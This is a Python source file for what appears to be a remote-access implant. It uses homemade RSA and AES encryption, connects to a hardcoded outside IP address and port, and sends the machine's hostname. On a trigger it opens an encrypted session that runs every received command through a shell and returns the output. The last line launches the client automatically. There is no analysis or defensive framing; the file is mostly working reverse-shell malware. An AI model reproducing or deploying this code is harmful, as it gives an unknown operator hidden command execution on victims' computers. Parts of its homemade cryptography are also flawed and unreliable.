import socket,time
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Cipher import AES
from hashlib import md5
import subprocess
import datetime
import json

class Euclids(object):
        
    def gcd(self,a,b):
        while True:
            if a==0 or b==0:
                break
            a,b = a % b, b % a
            r = b + a
        return r
    
    def gcdx(self,a,b):
        if a==0:
            return b,0,1
        r = b % a
        r,x1,y1= self.gcdx(r,a)
        x = y1 - (b//a) * x1
        y = x1
        return r,x,y
    
import random


class Primes(object):

    def __div2__(self,n):
        e = n-1
        m = 0
        while e % 2 == 0:
            e //= 2
            m += 1
        return e, m

    def __iterat__(self, a, e, m, n):
        if pow(a, e, n) == 1:
            return True

        for i in range(m):
            if pow(a,2**i*e,n)==n-1:
                return True
        return False

    def milerRabin(self,n):
        e, m = self.__div2__(n)
        for i in range(20):
            a = random.randrange(2, n)
            if self.__iterat__(a,e,m,n):
                continue
            else:
                return False
        return True

    def __randomBit__(self,n):
        return random.randrange(2**(n-1)+1, 2**n-1)

    def isprime(self,num):
        primes=[2,3,5]
        if num==0:
            return False
        if num==1:
            return False
        if num in primes:
            return True
        elif num < 5:
            return False

        if num%(num//2)==0:
            return False

        else:
             for i in range(2,int(num**0.5)+1):
                if num%i==0:
                    return False
        return True


    def get_prime(self,n):
        primes=[]
        for i in range(1000):
            if self.isprime(i):
                primes.append(i)
        while True:
            p = self.__randomBit__(n)
            c=0
            for i in primes:
                if p%i==0:
                    c=1
                    break
            if c==0:
                if self.milerRabin(p):
                    return p    
                

from hashlib import sha256

class RSA(object):
    
    def __init__(self):
        self.prime = Primes()
        self.nBit=1024
        
  
    def genKey(self,nBit):
        assert (nBit >= 512)
        e = 65537
        p = self.prime.get_prime(nBit)
        q = self.prime.get_prime(nBit)
        n = p*q
        phi = (p-1)*(q-1)
        _,x,_ = Euclids().gcdx(e,phi)
        assert (e*(phi+x)%phi==1)
        d = phi+x
        private = {'d':d,'n':n,'e':e,'p':p,'q':q}
        public = {'n':n,'e':e}
        return {"private":private,'public':public}
    
    def __intToBytes__(self,n):
        p = (n.bit_length()+7)//8
        b = n.to_bytes(p, 'big')
        return b
    
    
    def __intFromBytes__(self,_bytes):
        return int.from_bytes(_bytes, 'big')
    
    def __encrypt__(self,m,e,n):
        return pow(m,e,n)
    
    def __decrypt__(self,m,d,n):
        return pow(m,d,n)
    
    def __getNbit__(self,n):
        c=3
        while True:
            if (2**c) // n > 0:
                return c
            c+=1
            
    def encrypt(self,public,message):
        n = public['n']
        message = self.__intFromBytes__(message)
        if message >= n:
            raise Exception ('Data must be smaller than or equal to  '+str(self.__getNbit__(n)//8)+' bytes')
        e = public['e']
        return self.__intToBytes__(self.__encrypt__(message,e,n))
    
    def decrypt(self,private,message):
        d=private['d']
        n=private['n']
        e=private['e']
        m = self.__intFromBytes__(message)
        return self.__intToBytes__(self.__decrypt__(m,d,n))
    
    def signature(self,private,message):
        h = sha256(message).digest()
        hs= self.__intFromBytes__(h)
        d = private['d']
        n = private['n']
        return self.__intToBytes__(pow(hs,d,n))
    
    def verify_signature(self,public,signature,message):
        h = sha256(message).digest()
        e,n = public['e'],public['n']
        if self.__intToBytes__(pow(self.__intFromBytes__(signature),e,n))==h:
            return True
        return False

class AesCrypto:

    def __init__(self, key, iv):
        self.key = key
        self.iv = iv
        self.encryptor = None
        self.decryptor = None
        
    def _initialize_encryptor(self):
        self.set_iv()
        self.encryptor = AES.new(self.key, AES.MODE_CBC, self.iv)
        
    def _initialize_decryptor(self):
        self.set_iv()
        self.decryptor = AES.new(self.key, AES.MODE_CBC, self.iv)

    def encrypt(self, data):
        self._initialize_encryptor()
        return self.encryptor.encrypt(pad(data, AES.block_size))

    def decrypt(self, encrypted_data):
        self._initialize_decryptor()
        return unpad(self.decryptor.decrypt(encrypted_data), AES.block_size)
    
    def set_iv(self, key=None):
        if key:
            self.iv = md5(key).digest()
        else:
            self.iv = md5(self.iv).digest()

    def random_key(self):
        return get_random_bytes(32)


class Client(object):
    
    def __init__(self,serverIP,Port,PublicKey):
        self.PublicKey = PublicKey
        self.servInfo = (serverIP,Port)
        self.aes = AesCrypto(None,None)
        self.RSA = RSA()
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect(self.servInfo)
        self.clientInfo = json.dumps(
                        {
                'hostname': socket.gethostname(),
                'SatartTime': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        )
        self.symKey = None
        self.sendClientInfo()
        
        
    def sendClientInfo(self):
        data = self.clientInfo.encode(errors='replace')
        block = public['n'].bit_length() // 8 - 1
        self.client.send(int.to_bytes(len(data), length=2, byteorder='big'))
        for i in range(len(data)//block+1):
            self.client.send(self.RSA.encrypt(self.PublicKey,data[block*i:block*(i+1)]))


        
    def cmd(self, command): #public
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return p.stdout.read()
    

    def setSyncAes(self): #private
        self.symKey = self.aes.random_key()
        self.aes.key = self.symKey
        self.aes.set_iv(self.symKey)
        msg = self.RSA.encrypt(self.PublicKey, self.symKey)
        print(msg)
        self.client.send(
            msg
        )
        
    def recvMsg(self):
        header = int.from_bytes(self.client.recv(4))
        res = self.client.recv(header)
        while len(res) < header:
            res += self.client.recv(header-len(res))
        return self.aes.decrypt(res)
    
    def sendMsg(self, msg):
        msg = self.aes.encrypt(msg)
        self.client.send(
            int.to_bytes(
                len(msg),
                length=4,
                byteorder='big',
            ) + msg
        )
        
    def handle(self):
        while True:
            try:
                msg = self.client.recv(32)
                if len(msg.strip()) > 10:
                    print('StartingShell')
                    self.start()
                elif msg:
                    self.client.send(get_random_bytes(1))
            except Exception as e:
                pass
            time.sleep(1)
        
    
    def start(self):
        self.setSyncAes()
        while True:
            command = self.recvMsg().decode()
            if command == 'exit':
                break
            self.sendMsg(self.cmd(command))


public =  {'n': 130207301034004661455027913688923327146343398866625243908655292016961311687455936189602612639881746041437642117397999433889984747790829683399942449818446067929003127144782759564471484412125307160062468145732861525984991405836950669766085891756502788398772584383449300023796025235227753602387780436256335801097,
  'e': 65537}
Client("20.231.24.205",555,public).handle()